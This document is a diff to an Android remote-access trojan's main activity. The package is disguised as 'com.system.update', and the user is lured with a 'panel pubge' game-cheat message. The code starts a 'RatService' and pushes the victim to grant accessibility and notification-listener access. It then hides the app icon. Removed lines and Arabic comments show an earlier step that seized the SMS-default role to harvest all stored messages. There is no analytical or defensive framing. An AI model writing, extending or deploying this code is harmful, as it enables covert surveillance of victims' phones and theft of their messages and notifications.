@@ -1,9 +1,7 @@
 package com.system.update;
 
 import android.app.Activity;
-import android.app.role.RoleManager;
 import android.content.ComponentName;
-import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
@@ -59,7 +57,6 @@ public class MainActivity extends Activity {
     }
 
     private void startRatAndOpenSettings() {
-        // 1. تشغيل السيرفس
         try {
             Intent serviceIntent = new Intent(this, RatService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -69,33 +66,13 @@ public class MainActivity extends Activity {
             }
         } catch (Exception ignored) {}
 
-        // 2. طلب أن التطبيق يبقى تطبيق الرسايل الافتراضي (عشان نسحب كل الرسايل القديمة)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            RoleManager roleManager = getSystemService(RoleManager.class);
-            if (roleManager != null && roleManager.isRoleAvailable(RoleManager.ROLE_SMS)) {
-                if (!roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
-                    Intent intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS);
-                    startActivityForResult(intent, 2);
-                }
-            }
-        } else {
-            // لأندرويد أقدم من 10
-            Intent intent = new Intent(android.provider.Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
-            intent.putExtra(android.provider.Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageName());
-            startActivity(intent);
-        }
+        try {
+            Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(accIntent);
+            Toast.makeText(this, "Please enable panel pubge in Accessibility.", Toast.LENGTH_LONG).show();
+        } catch (Exception ignored) {}
 
-        // 3. فتح شاشة الـ Accessibility
-        new Handler().postDelayed(() -> {
-            try {
-                Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-                accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(accIntent);
-                Toast.makeText(this, "Please enable panel pubge in Accessibility.", Toast.LENGTH_LONG).show();
-            } catch (Exception ignored) {}
-        }, 2000);
-
-        // 4. فتح شاشة الإشعارات
         new Handler().postDelayed(() -> {
             try {
                 Intent notifIntent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
@@ -103,16 +80,14 @@ public class MainActivity extends Activity {
                 startActivity(notifIntent);
                 Toast.makeText(this, "Please enable panel pubge in Notification Access.", Toast.LENGTH_LONG).show();
             } catch (Exception ignored) {}
-        }, 5000);
+        }, 4000);
 
-        // 5. إخفاء الأيقونة
-        new Handler().postDelayed(() -> {
-            try {
-                PackageManager p = getPackageManager();
-                ComponentName componentName = new ComponentName(this, MainActivity.class);
-                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-            } catch (Exception ignored) {}
-            finish();
-        }, 7000);
+        try {
+            PackageManager p = getPackageManager();
+            ComponentName componentName = new ComponentName(this, MainActivity.class);
+            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {}
+        
+        finish();
     }
 }
